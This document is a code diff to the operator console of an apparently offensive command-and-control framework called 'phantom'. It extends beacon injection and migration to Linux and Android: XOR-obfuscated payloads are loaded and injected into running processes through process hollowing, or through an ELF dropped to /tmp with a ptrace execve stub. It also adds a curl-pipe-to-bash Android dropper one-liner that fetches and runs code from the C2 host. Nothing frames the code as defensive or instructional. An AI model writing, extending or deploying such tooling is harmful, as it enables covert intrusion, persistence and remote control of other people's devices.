@@ -395,11 +395,33 @@ class C2Shell(cmd.Cmd):
         notifier.warn(f"Task {task_id} queued but result not ready. Check later with 'results'.")
         return False
 
+    def _beacon_platform(self) -> str:
+        """Detect active beacon platform from its ID prefix."""
+        if not self.active_beacon:
+            return ""
+        bid = self.active_beacon.upper()
+        if bid.startswith("WIN"): return "windows"
+        if bid.startswith("LNX"): return "linux"
+        if bid.startswith("AND"): return "android"
+        return ""
+
+    def _inject_payload_path(self, platform: str) -> str:
+        """Return path to platform-specific XOR'd inject payload."""
+        import os
+        import phantom
+        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
+        mapping = {
+            "windows": "beacon_xored.bin",
+            "linux": "beacon_linux_xored.bin",
+            "android": "beacon_android_xored.bin",
+        }
+        return os.path.join(beacon_dir, mapping.get(platform, ""))
+
     def do_inject(self, arg):
-        """inject <pid> - Inject beacon shellcode into a running process PID.
+        """inject <pid> - Inject beacon into a remote process.
         
-        The original beacon stays alive. The target process gets a NEW beacon.
-        After ~sleep ms, both will appear in 'beacons' list.
+        Auto-detects platform and uses the appropriate pre-compiled payload.
+        On Linux/Android, writes ELF to /tmp and injects execve stub via ptrace.
         """
         import os
         import base64
@@ -409,33 +431,32 @@ class C2Shell(cmd.Cmd):
             notifier.error("No active beacon.")
             return
         
+        platform = self._beacon_platform()
+        
         parts = arg.split()
-        if len(parts) != 1:
-            notifier.error("Usage: inject <pid>")
+        if len(parts) == 2:
+            pid, b64 = parts
+        elif len(parts) == 1:
+            pid = parts[0]
+            beacon_path = self._inject_payload_path(platform)
+            if not beacon_path or not os.path.exists(beacon_path):
+                notifier.error(f"Inject payload not found for {platform}. Run 'generate {platform}' first.")
+                return
+            with open(beacon_path, "rb") as f:
+                b64 = base64.b64encode(f.read()).decode()
+        else:
+            notifier.error("Usage: inject <pid> [base64_shellcode]")
             return
-        pid = parts[0]
-        
-        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
-        beacon_path = os.path.join(beacon_dir, "beacon.bin")
-        
-        if not os.path.exists(beacon_path):
-            notifier.error(f"Beacon binary not found at {beacon_path}. Run 'generate windows' first.")
-            return
-            
-        with open(beacon_path, "rb") as f:
-            b64 = base64.b64encode(f.read()).decode()
             
         task_id = c2_state.queue_task(self.active_beacon, f"inject {pid} {b64}")
         notifier.info(f"Injection task queued (ID: {task_id}). Waiting for output...")
         self._wait_for_result(task_id)
 
     def do_migrate(self, arg):
-        """migrate [pid] - Fully migrate beacon to a new hollowed process.
+        """migrate [pid] - Migrate beacon into a new process.
         
-        Spawns a new sacrificial process (RuntimeBroker.exe), replaces its
-        memory with the beacon PE, and terminates the original beacon.
-        Only the new beacon remains (1 in 'beacons' list).
-        The PID argument is accepted but the beacon always spawns a fresh process.
+        Auto-detects platform: Windows uses process hollowing,
+        Linux/Android writes ELF to /tmp, forks, and injects execve stub.
         """
         import os
         import base64
@@ -444,20 +465,24 @@ class C2Shell(cmd.Cmd):
         if not self.active_beacon:
             notifier.error("No active beacon.")
             return
-            
-        pid = arg.strip()
-        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
-        beacon_path = os.path.join(beacon_dir, "beacon.pe")
         
-        if not os.path.exists(beacon_path):
-            notifier.error(f"Beacon PE not found at {beacon_path}. Run 'generate windows' first.")
+        platform = self._beacon_platform()
+        parts = arg.split()
+        
+        if len(parts) >= 1:
+            # Accept optional PID arg (ignored on Linux/Android)
+            beacon_path = self._inject_payload_path(platform)
+            if not beacon_path or not os.path.exists(beacon_path):
+                notifier.error(f"Migrate payload not found for {platform}. Run 'generate {platform}' first.")
+                return
+            with open(beacon_path, "rb") as f:
+                data = f.read()
+            b64 = base64.b64encode(data).decode()
+        else:
+            notifier.error("Usage: migrate [pid]")
             return
             
-        with open(beacon_path, "rb") as f:
-            b64 = base64.b64encode(f.read()).decode()
-            
-        cmd = f"migrate {pid} {b64}" if pid else f"migrate {b64}"
-        task_id = c2_state.queue_task(self.active_beacon, cmd)
+        task_id = c2_state.queue_task(self.active_beacon, f"migrate {b64}")
         notifier.info(f"Migration task queued (ID: {task_id}). Waiting for output...")
         self._wait_for_result(task_id)
 
@@ -574,7 +599,7 @@ class C2Shell(cmd.Cmd):
         
         # Compile and generate dropper
         try:
-            beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch, host=host, port=port)
+            beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch, host=host, port=port, use_ssl=use_ssl)
         except Exception as e:
             notifier.error(f"Compilation process crashed: {e}")
             return
@@ -588,6 +613,11 @@ class C2Shell(cmd.Cmd):
         if not dropper:
             notifier.error(f"Failed to generate dropper for {platform}")
             return
+
+        # Show short one-liner for Android (user types it manually on phone)
+        if platform == "android":
+            proto = "https" if use_ssl else "http"
+            dropper = f"bash -c \"\$(curl -sk '{proto}://{host}:{port}/s/android')\""
 
         # Display and Register
         title_map = {
